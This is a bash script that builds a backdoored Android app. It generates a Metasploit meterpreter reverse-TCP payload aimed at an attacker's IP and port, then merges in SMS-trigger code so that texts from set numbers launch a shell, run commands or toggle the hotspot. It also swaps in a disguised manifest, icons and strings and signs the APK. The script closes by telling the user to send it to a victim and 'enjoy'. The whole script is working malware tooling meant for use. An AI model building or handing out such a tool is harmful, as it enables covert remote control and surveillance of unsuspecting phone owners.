echo "ip:port "$1":"$2;
echo "Create android apk with sms controlled backdoor";
echo "1.sms specific trigger";
echo "2.trigger for all sms";
read ch;
echo "enter ip Default "$1;
read i;
echo "enter port [Default $2]";
read p
port=${p:-$2}
ip=${i:-$1}
echo "ip:port "$ip":"$port;
sleep 1
echo "cleaning directory...";
rm -rf sms-triggered1/ -v
rm -rf sms-decoded -v
rm -rf sms-triggered2/ -v
rm meterpreter.apk -v
rm -rf  meterpreter/ -v
rm sign/meterpreter.apk -v
rm sign/signed.apk -v


echo "creating simple mainactivity...";
msfvenom -p android/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -o meterpreter.apk
echo "--------mainactivity created----------";



case $ch in
	1)
		
		echo "start decompiling apks";
		apktool decode meterpreter.apk
		apktool decode sms-triggered1.apk
		mv sms-triggered1 sms-decoded
		
	;;
	2)
		echo "start decompiling apks";
		apktool decode meterpreter.apk
		apktool decode sms-triggered2.apk
		mv sms-triggered2 sms-decoded
		
	;;
	esac
		echo "decompiled both the apks press enter";
		read
		echo "IF you want to change triggers you can make changes it in .smali file press y to open file"
		echo "Change the values for the  corresponding triggers
			 passwd="goo.gl.ltRmUp";
			 check="+1428345601";
			 meterpreter="+1428345602";
			 terminal="+1428345603";
			 command="+1428345604";
			 update="+1428345605";
			 hotspoton = "+1428345606";
			 hotspotonnull = "+1428345607";
			 hotspotoff = "+1428345608";"	
		read choice
		case $choice in
		y)
			gedit sms-decoded/smali/com/metasploit/stage/MainBroadcastReceiver.smali		
		;;
		esac
		echo "press enter"
		read
		
		echo "combining both the decompiled apks";
		rm meterpreter/smali/com/metasploit/stage/MainBroadcastReceiver.smali -v
		cp sms-decoded/smali/com/metasploit/stage/Main.smali meterpreter/smali/com/metasploit/stage/ -v
		cp sms-decoded/smali/com/metasploit/stage/MainBroadcastReceiver.smali meterpreter/smali/com/metasploit/stage/ -v
		cp sms-decoded/smali/com/metasploit/stage/Hotspot.smali meterpreter/smali/com/metasploit/stage/ -v
		cp sms-decoded/smali/com/metasploit/stage/Update.smali meterpreter/smali/com/metasploit/stage/ -v
		cp sms-decoded/smali/com/metasploit/stage/Update\$1.smali meterpreter/smali/com/metasploit/stage/ -v
		rm meterpreter/AndroidManifest.xml -v
		cp resources/AndroidManifest.xml meterpreter/ -v
		cp -r resources/drawable-ldpi-v4/ meterpreter/res/ -v
		cp -r resources/drawable-mdpi-v4/ meterpreter/res/ -v
		cp -r resources/drawable-hdpi-v4/ meterpreter/res/ -v
		rm meterpreter/res/values/strings.xml -v
		cp resources/strings.xml  meterpreter/res/values/ -v
		apktool b meterpreter -v
		mv meterpreter/dist/meterpreter.apk sign/ -v
		cd sign/ && java -jar signapk.jar certificate.pem key.pk8 meterpreter.apk signed.apk
		echo "final apk is signed.apk send to victim and give autostart permission and enjoy :)"
		nautilus .
exec bash

